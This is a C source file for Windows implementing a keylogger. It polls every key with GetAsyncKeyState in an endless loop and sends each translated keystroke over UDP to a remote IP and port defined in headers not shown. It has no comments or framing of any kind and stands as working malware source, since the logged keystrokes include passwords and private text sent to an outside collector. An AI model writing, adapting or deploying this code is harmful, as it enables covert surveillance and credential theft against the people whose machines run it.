#include <stdio.h>
#include <winsock2.h>

#include "key.h"
#include "network.h"

void app()
{
    SOCKET client = init_connection();
    struct sockaddr_in serv;
    char client_message[BUF_SIZE];
    memset(client_message, '\0', sizeof(client_message));

    serv.sin_family = AF_INET;
    serv.sin_port = htons(PORT);
    serv.sin_addr.s_addr = inet_addr(IP);

    while (1)
        for (DWORD i = 0; i < 255; i++)
            if (GetAsyncKeyState(i) == -32767)
                send_message(client, serv, translate_key(i));
}

void init(void)
{
    WSADATA wsa;
    int err = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (err < 0)
    {
        puts("WSAStartup failed !");
        exit(EXIT_FAILURE);
    }
}

void end(void)
{
    WSACleanup();
}

SOCKET init_connection()
{
    SOCKET client = socket(AF_INET, SOCK_DGRAM, 0);
    if (client == INVALID_SOCKET)
    {
        perror("socket()");
        exit(errno);
    }
    return client;
}

void send_message(SOCKET sock, SOCKADDR_IN serv, char *buffer)
{
    int server_struct_length = sizeof(serv);
    if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&serv, server_struct_length) < 0)
    {
        perror("sendto()");
        exit(errno);
    }
}